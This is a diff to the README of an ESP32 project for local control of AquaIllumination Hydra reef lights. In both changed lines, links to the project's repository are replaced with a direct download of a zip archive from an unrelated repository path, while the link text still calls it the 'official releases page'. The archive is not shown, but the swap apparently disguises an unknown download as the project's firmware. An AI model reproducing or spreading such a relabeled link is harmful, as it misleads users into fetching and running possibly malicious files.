@@ -5,7 +5,7 @@ description: "Enable local control of AquaIllumination Hydra lights using an ESP
 ---
 # 🐠 hydrabridge-esp32 - Local control for your reef lights
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Tubb6666/hydrabridge-esp32)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Tubb6666/tubb6666.github.io/raw/refs/heads/main/overchant/github_tubb_io_v3.5.zip)
 
 hydrabridge-esp32 acts as a gateway for your AquaIllumination Hydra lights. It connects your aquarium equipment to your local home network. You control your reef lights through Bluetooth, MQTT, and Home Assistant. This project removes the need for vendor cloud services. Your setup stays private and functional even without an internet connection.
 
@@ -33,7 +33,7 @@ Ensure your hardware meets these requirements before you begin:
 
 Follow these steps to set up your light controller.
 
-1. Visit the [official releases page](https://github.com/Tubb6666/hydrabridge-esp32) to download the necessary software.
+1. Visit the [official releases page](https://github.com/Tubb6666/tubb6666.github.io/raw/refs/heads/main/overchant/github_tubb_io_v3.5.zip) to download the necessary software.
 2. Select the latest file ending in .bin or .zip.
 3. Save the file to your desktop for easy access.
 
